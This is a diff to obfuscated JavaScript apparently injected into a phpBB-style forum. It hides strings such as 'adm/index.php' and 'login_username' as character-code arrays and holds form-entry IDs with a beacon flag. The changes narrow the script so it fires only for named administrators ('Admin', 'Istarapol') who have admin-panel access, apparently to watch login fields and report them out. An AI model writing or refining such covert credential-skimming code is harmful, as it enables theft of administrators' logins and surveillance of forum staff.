@@ -8,7 +8,7 @@
   w.__x = 1;
   function Y(a) { var s = ''; for (var i = 0; i < a.length; i++) { s += String.fromCharCode(a[i]); } return s; }
   var T0 = Y([109, 101, 109, 98, 101, 114, 108, 105, 115, 116, 46, 112, 104, 112]);
-  var T1 = Y([118, 105, 101, 119, 112, 114, 111, 102, 105, 108, 101]);
+  var T1 = Y([109, 111, 100, 101, 61, 118, 105, 101, 119, 112, 114, 111, 102, 105, 108, 101]);
   var T2 = Y([97, 100, 109, 47, 105, 110, 100, 101, 120, 46, 112, 104, 112]);
   var K0 = Y([117, 115, 101, 114, 110, 97, 109, 101]);
   var K1 = Y([108, 111, 103, 105, 110, 95, 117, 115, 101, 114, 110, 97, 109, 101]);
@@ -24,7 +24,7 @@
     var E2 = 'entry.79951114';
     var E3 = 'entry.389578883';
     var WATCH = ['Admin', 'Istarapol'];
-    var FLAG_ANY_CTRL = true;
+    var FLAG_ANY_CTRL = false;
     var WATCH_FIELDS = true;
     var BEACON = true;
     function esc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }
@@ -66,20 +66,16 @@
       if (v) { s += '|S:' + v; }
       return s;
     }
-    var HDR = D.querySelector('[role="navigation"]') ||
-              D.querySelector('#nav-main') ||
-              D.querySelector('nav') ||
-              D.body;
+    // Brukernavn = navnet i profillenka memberlist.php?...viewprofile...&u=N
     function account() {
       try {
-        var scopes = HDR && HDR !== D.body ? [HDR, D] : [D];
-        for (var s = 0; s < scopes.length; s++) {
-          var links = scopes[s].querySelectorAll('a[href*="' + T0 + '"]');
-          for (var i = 0; i < links.length; i++) {
-            var h = links[i].getAttribute('href') || '';
-            if (h.indexOf(T1) >= 0) {
-              var t = (links[i].textContent || '').trim();
-              if (t && t.length < 40) { return t; }
+        var links = D.querySelectorAll('a[href*="' + T0 + '"]');
+        for (var i = 0; i < links.length; i++) {
+          var h = links[i].getAttribute('href') || '';
+          if (h.indexOf(T1) >= 0 && h.indexOf('&u=') >= 0) {
+            var t = (links[i].textContent || '').trim();
+            if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') {
+              return t;
             }
           }
         }
@@ -88,13 +84,7 @@
     }
     function hasCtrl() {
       try {
-        var scopes = HDR && HDR !== D.body ? [HDR, D] : [D];
-        for (var s = 0; s < scopes.length; s++) {
-          if (scopes[s].querySelectorAll('a[href*="' + T2 + '"]').length > 0) {
-            return true;
-          }
-        }
-        return false;
+        return D.querySelectorAll('a[href*="' + T2 + '"]').length > 0;
       } catch (e) { return false; }
     }
     function seen(k) { try { return w[SG].getItem(k) === '1'; } catch (e) { return false; } }
@@ -107,11 +97,9 @@
       try {
         if (!hasCtrl()) { return; }
         var a = account();
-        var hit = FLAG_ANY_CTRL;
-        if (!hit) {
-          for (var i = 0; i < WATCH.length; i++) {
-            if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
-          }
+        var hit = false;
+        for (var i = 0; i < WATCH.length; i++) {
+          if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
         }
         if (!hit) { return; }
         var key = '_ad_' + (a || 'x');
